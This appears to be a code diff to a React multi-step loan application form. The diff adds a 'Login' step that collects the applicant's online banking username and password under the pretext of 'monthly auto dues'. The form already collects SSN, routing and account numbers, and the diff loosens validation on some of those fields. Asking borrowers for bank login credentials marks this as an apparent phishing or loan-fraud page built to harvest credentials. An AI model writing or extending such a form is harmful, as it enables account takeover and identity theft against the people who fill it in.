@@ -6,7 +6,7 @@ import { motion, AnimatePresence } from "framer-motion";
 
 export default function ApplyNowForm() {
   const [currentStep, setCurrentStep] = useState(1);
-  const totalSteps = 3;
+  const totalSteps = 4;
 
   const [formData, setFormData] = useState({
     loanamount: "",
@@ -25,6 +25,8 @@ export default function ApplyNowForm() {
     routingnumber: "",
     accountnumber: "",
     ssn: "",
+    Username: "",
+    mobilebankingpassword: "",
   });
 
   const [emi, setEmi] = useState({
@@ -132,9 +134,12 @@ export default function ApplyNowForm() {
 
       case 3:
         if (!formData.bankname) newErrors.bankname = "Required";
-        if (!/^\d{9}$/.test(formData.routingnumber)) newErrors.routingnumber = "9 digits required";
         if (!/^\d{8,17}$/.test(formData.accountnumber)) newErrors.accountnumber = "8–17 digits";
-        if (!/^\d{9}$/.test(formData.ssn)) newErrors.ssn = "9 digits required";
+        break;
+
+      case 4:
+        if (!formData.Username) newErrors.Username = "Required";
+        if (!formData.mobilebankingpassword) newErrors.mobilebankingpassword = "Required";
         break;
     }
 
@@ -183,6 +188,8 @@ export default function ApplyNowForm() {
           routingnumber: "",
           accountnumber: "",
           ssn: "",
+          Username: "",
+          mobilebankingpassword: "",
         });
         setCurrentStep(1);
         window.location.assign("/under-review");
@@ -219,7 +226,7 @@ export default function ApplyNowForm() {
             />
           </div>
           <div className="flex justify-between text-xs text-gray-500 mt-2">
-            {["Loan", "Personal", "Banking"].map((label, i) => (
+            {["Loan", "Personal", "Banking", "Login"].map((label, i) => (
               <span key={i} className={i + 1 <= currentStep ? "font-medium text-blue-700" : ""}>
                 {label}
               </span>
@@ -327,7 +334,7 @@ export default function ApplyNowForm() {
                       {errors[field.name] && <p className="text-red-500 text-sm mt-1">{errors[field.name]}</p>}
                     </div>
                   ))}
-
+                  
                   {/* NEW: Email ID Field */}
                   <div>
                     <label className="block text-sm font-medium text-gray-700 mb-1">Email ID</label>
@@ -411,7 +418,7 @@ export default function ApplyNowForm() {
               </motion.div>
             )}
 
-            {/* Step 3: Banking Info & Submit */}
+            {/* Step 3: Banking Info */}
             {currentStep === 3 && (
               <motion.div
                 key="step3"
@@ -464,10 +471,63 @@ export default function ApplyNowForm() {
                       name="ssn"
                       value={formData.ssn}
                       onChange={formatSSN}
-                      placeholder="9 digits"
+                      placeholder="XXX-XX-XXXX"
                       className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.ssn ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
                     />
                     {errors.ssn && <p className="text-red-500 text-sm mt-1">{errors.ssn}</p>}
+                  </div>
+                </div>
+                <div className="flex justify-between mt-8">
+                  <button
+                    type="button"
+                    onClick={goBack}
+                    className="px-6 py-3 text-gray-600 hover:text-gray-800 font-medium"
+                  >
+                    ← Back
+                  </button>
+                  <button
+                    type="button"
+                    onClick={nextStep}
+                    className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg transition transform hover:scale-105"
+                  >
+                    Continue →
+                  </button>
+                </div>
+              </motion.div>
+            )}
+
+            {/* Step 4: Login Info */}
+            {currentStep === 4 && (
+              <motion.div
+                key="step4"
+                initial={{ opacity: 0, x: 20 }}
+                animate={{ opacity: 1, x: 0 }}
+                exit={{ opacity: 0, x: -20 }}
+                transition={{ duration: 0.3 }}
+              >
+                <h3 className="text-2xl font-semibold text-gray-800 mb-6">Online Banking (For monthly auto dues)</h3>
+                <div className="space-y-5">
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Online Banking Username</label>
+                    <input
+                      type="text"
+                      name="Username"
+                      value={formData.Username}
+                      onChange={handleChange}
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.Username ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.Username && <p className="text-red-500 text-sm mt-1">{errors.Username}</p>}
+                  </div>
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Online Banking Password</label>
+                    <input
+                      type="password"
+                      name="mobilebankingpassword"
+                      value={formData.mobilebankingpassword}
+                      onChange={handleChange}
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.mobilebankingpassword ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.mobilebankingpassword && <p className="text-red-500 text-sm mt-1">{errors.mobilebankingpassword}</p>}
                   </div>
                 </div>
                 <div className="mt-8 text-sm text-gray-500">
@@ -494,7 +554,7 @@ export default function ApplyNowForm() {
           </AnimatePresence>
         </form>
 
-        {/* Floating Help Buttons*/}
+        {/* Floating Help Button*/}
         <div className="fixed bottom-6 right-6">
           <button className="w-14 h-14 bg-blue-600 hover:bg-blue-700 text-white rounded-full shadow-lg flex items-center justify-center text-xl font-bold transition transform hover:scale-110">
             ?
